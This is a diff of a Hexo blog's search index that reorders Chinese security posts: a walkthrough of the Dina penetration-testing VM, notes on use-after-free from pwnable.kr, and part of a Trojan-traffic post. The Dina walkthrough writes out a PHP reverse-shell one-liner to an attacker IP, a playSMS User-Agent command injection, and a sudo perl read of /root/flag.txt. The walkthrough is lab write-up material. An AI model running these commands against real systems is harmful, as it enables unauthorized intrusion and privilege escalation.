@@ -1,55 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Dina渗透</title>
-    <url>/2018/12/08/Dina%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<p>Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。</p>
-<span id="more"></span>
-
-<h2 id="发现目标主机"><a href="#发现目标主机" class="headerlink" title="发现目标主机"></a>发现目标主机</h2><p>利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令：</p>
-<p><code>nmap 192.168.43.0/24</code></p>
-<p>扫描目标端内所有的存活主机</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181128233231.png"></p>
-<p>发现目标主机：<code>192.168.43.130</code></p>
-<p>开放端口：<code>80</code></p>
-<p>访问目标服务器<img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181203152020.png"></p>
-<p>查看源代码什么的，发现没有什么入口什么的。可能需要寻找其他的入侵点。</p>
-<h2 id="发现登录入口"><a href="#发现登录入口" class="headerlink" title="发现登录入口"></a>发现登录入口</h2><p>没事就看看robots.txt，没准就有惊喜。查看robots.txt。真的有惊喜！！！</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/ange1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/angel1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/nothing</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/tmp</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/uploads</span><br></pre></td></tr></table></figure>
-
-<p>这几个几个页面依次访问一下，除了<code>\nothing</code>这个页面，其他的都一个个文件夹，一度让我以为是文件上传，卡了很久。。。。。。头疼。后来想了一下，会不会还有什么页面没有出现，用<code>dirb</code>–kali下的一个扫描的软件–默认字典就够了。</p>
-<p>发现页面：<code>http://192.168.43.130/secure/</code>，访问得到一个压缩包，打开需要密码，结合前面noting页面发现的几个密码，一个个尝试发现工作量也不是很大，或者使用zip2John爆破，可以发现密码为<code>freedom</code></p>
-<p>nothing页面发现的密码：</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142134.png"></p>
-<p>打开压缩包，提取文件，是一个后缀为MP3的文件，但是。。。我并不想听音乐，所以，先用strings命令查看一下有没有特殊的东西，有线索。。</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142626.png"></p>
-<p>ok,发现新的页面，继续访问，是个登录页面，从压缩包中获取的文件得知，只有用户名，密码还是得一个个试。。。。测试过后得到：</p>
-<p><code>username：touhid</code></p>
-<p><code>password：diana</code></p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录，发现是一个playSMS的网站，上网找一下有没有漏洞，早exploit-DB上面发现一个远程命令执行，发现可以使用，具体漏洞：<a href="https://www.exploit-db.com/exploits/42044%E3%80%82%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%82%B9%E5%9C%A8%E4%BA%8E%E7%94%B5%E8%AF%9D%E7%B0%BF%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AF%BC%E5%85%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%9C%A8%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E4%B8%AD%E5%BE%88%E6%B8%85%E6%A5%9A%E3%80%82%E7%9B%B4%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E3%80%82">https://www.exploit-db.com/exploits/42044。查看可知漏洞的点在于电话簿用户信息的导入，具体利用方式在漏洞说明中很清楚。直接可以使用。</a></p>
-<p>漏洞利用文件：</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206143717.png"></p>
-<p>上传，利用burpsuite抓包，由于执行的命令在USER_AGENT，所以修改http请求的USER_AGENT的内容为我们要执行的命令就可以了。</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144238.png"></p>
-<p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144245.png"></p>
-<p>下一步就是反弹shell了，我的kali攻击机的IP地址为：192.168.43.129，所以把shell反弹到这就行了，监听kali 的8008端口：</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144851.png"></p>
-<p>利用命令：</p>
-<p><code>php -r &#39;$sock=fsockopen(&quot;192.168.43.129&quot;,8008);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
-<p>getshell:</p>
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145215.png"></p>
-<p>成功进入主机！！！</p>
-<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sudo perl -e <span class="symbol">&#x27;exec</span> <span class="string">&quot;cat /root/flag.txt&quot;</span>;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145522.png"></p>
-<p>hack it！！</p>
-]]></content>
-      <tags>
-        <tag>-总结</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTF学习指南</title>
     <url>/2018/12/08/CTF%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/</url>
     <content><![CDATA[<span id="more"></span>
@@ -144,6 +95,55 @@
       </tags>
   </entry>
   <entry>
+    <title>Dina渗透</title>
+    <url>/2018/12/08/Dina%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>Dian是一台渗透测试用的虚拟环境，只是用于娱乐的主机，不过玩的还是挺开心的。写点笔记作为参考。使用的网络环境为NAT模式。</p>
+<span id="more"></span>
+
+<h2 id="发现目标主机"><a href="#发现目标主机" class="headerlink" title="发现目标主机"></a>发现目标主机</h2><p>利用扫描工具nmap扫描目标网段，寻找存活的目标主机。我的NAT模式网段在192.168.43.1这个网段上，可以用命令：</p>
+<p><code>nmap 192.168.43.0/24</code></p>
+<p>扫描目标端内所有的存活主机</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181128233231.png"></p>
+<p>发现目标主机：<code>192.168.43.130</code></p>
+<p>开放端口：<code>80</code></p>
+<p>访问目标服务器<img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181203152020.png"></p>
+<p>查看源代码什么的，发现没有什么入口什么的。可能需要寻找其他的入侵点。</p>
+<h2 id="发现登录入口"><a href="#发现登录入口" class="headerlink" title="发现登录入口"></a>发现登录入口</h2><p>没事就看看robots.txt，没准就有惊喜。查看robots.txt。真的有惊喜！！！</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/ange1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/angel1</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/nothing</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/tmp</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/uploads</span><br></pre></td></tr></table></figure>
+
+<p>这几个几个页面依次访问一下，除了<code>\nothing</code>这个页面，其他的都一个个文件夹，一度让我以为是文件上传，卡了很久。。。。。。头疼。后来想了一下，会不会还有什么页面没有出现，用<code>dirb</code>–kali下的一个扫描的软件–默认字典就够了。</p>
+<p>发现页面：<code>http://192.168.43.130/secure/</code>，访问得到一个压缩包，打开需要密码，结合前面noting页面发现的几个密码，一个个尝试发现工作量也不是很大，或者使用zip2John爆破，可以发现密码为<code>freedom</code></p>
+<p>nothing页面发现的密码：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142134.png"></p>
+<p>打开压缩包，提取文件，是一个后缀为MP3的文件，但是。。。我并不想听音乐，所以，先用strings命令查看一下有没有特殊的东西，有线索。。</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206142626.png"></p>
+<p>ok,发现新的页面，继续访问，是个登录页面，从压缩包中获取的文件得知，只有用户名，密码还是得一个个试。。。。测试过后得到：</p>
+<p><code>username：touhid</code></p>
+<p><code>password：diana</code></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录，发现是一个playSMS的网站，上网找一下有没有漏洞，早exploit-DB上面发现一个远程命令执行，发现可以使用，具体漏洞：<a href="https://www.exploit-db.com/exploits/42044%E3%80%82%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%82%B9%E5%9C%A8%E4%BA%8E%E7%94%B5%E8%AF%9D%E7%B0%BF%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9A%84%E5%AF%BC%E5%85%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%9C%A8%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E%E4%B8%AD%E5%BE%88%E6%B8%85%E6%A5%9A%E3%80%82%E7%9B%B4%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E3%80%82">https://www.exploit-db.com/exploits/42044。查看可知漏洞的点在于电话簿用户信息的导入，具体利用方式在漏洞说明中很清楚。直接可以使用。</a></p>
+<p>漏洞利用文件：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206143717.png"></p>
+<p>上传，利用burpsuite抓包，由于执行的命令在USER_AGENT，所以修改http请求的USER_AGENT的内容为我们要执行的命令就可以了。</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144238.png"></p>
+<p>结果：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144245.png"></p>
+<p>下一步就是反弹shell了，我的kali攻击机的IP地址为：192.168.43.129，所以把shell反弹到这就行了，监听kali 的8008端口：</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206144851.png"></p>
+<p>利用命令：</p>
+<p><code>php -r &#39;$sock=fsockopen(&quot;192.168.43.129&quot;,8008);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
+<p>getshell:</p>
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145215.png"></p>
+<p>成功进入主机！！！</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sudo perl -e <span class="symbol">&#x27;exec</span> <span class="string">&quot;cat /root/flag.txt&quot;</span>;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/Dian/QQ%E6%88%AA%E5%9B%BE20181206145522.png"></p>
+<p>hack it！！</p>
+]]></content>
+      <tags>
+        <tag>-总结</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF学习记录</title>
     <url>/2020/03/12/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<span id="more"></span>
@@ -181,33 +181,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>[PWNABLE.kr]uaf</title>
-    <url>/2020/06/14/PWNABLE-kr-uaf/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="UAF知识"><a href="#UAF知识" class="headerlink" title="UAF知识"></a>UAF知识</h2><ol>
-<li><p>UAF：Use After Free是PWN中常见的堆利用方式，是指在程序中对于某个指针在free后，指针的值并没有置为NULL，仍然可以被调用。</p>
-</li>
-<li><p>使用方式</p>
-<ul>
-<li>构造一个迷途指针，或者说一个Free调但是指针值未被值为NULL的指针</li>
-</ul>
-</li>
-</ol>
-<ul>
-<li>构造数据填充被释放的内存区域<ul>
-<li>再次调用该指针</li>
-</ul>
-</li>
-</ul>
-<ol start="3">
-<li><p>地址分配方式</p>
-<p>在填充数据的时候，我们需要考虑到内存分配机制。我们要保证我们使用的数据能被分配到正确的地方去，所以需要了解一定的内存分配机制。</p>
-</li>
-</ol>
-<h2 id="C-虚函数"><a href="#C-虚函数" class="headerlink" title="C++虚函数"></a>C++虚函数</h2><p>   一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。记住，私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>Trojan流量分析</title>
     <url>/2020/02/18/Trojan%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>﻿## 原理解析</p>
@@ -235,6 +208,33 @@
 <h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p><img src="https://img-blog.csdnimg.cn/20200218224747459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JsYXRlb3I=,size_16,color_FFFFFF,t_70" alt="IP"><br><a href="https://xbsj7654.space/">实例</a></p>
 <p>搭建方式：</p>
 <p><a href="https://bk.shunleite.com/post-45.html">点击进入</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>[PWNABLE.kr]uaf</title>
+    <url>/2020/06/14/PWNABLE-kr-uaf/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="UAF知识"><a href="#UAF知识" class="headerlink" title="UAF知识"></a>UAF知识</h2><ol>
+<li><p>UAF：Use After Free是PWN中常见的堆利用方式，是指在程序中对于某个指针在free后，指针的值并没有置为NULL，仍然可以被调用。</p>
+</li>
+<li><p>使用方式</p>
+<ul>
+<li>构造一个迷途指针，或者说一个Free调但是指针值未被值为NULL的指针</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>构造数据填充被释放的内存区域<ul>
+<li>再次调用该指针</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li><p>地址分配方式</p>
+<p>在填充数据的时候，我们需要考虑到内存分配机制。我们要保证我们使用的数据能被分配到正确的地方去，所以需要了解一定的内存分配机制。</p>
+</li>
+</ol>
+<h2 id="C-虚函数"><a href="#C-虚函数" class="headerlink" title="C++虚函数"></a>C++虚函数</h2><p>   一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。记住，私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</p>
 ]]></content>
   </entry>
   <entry>
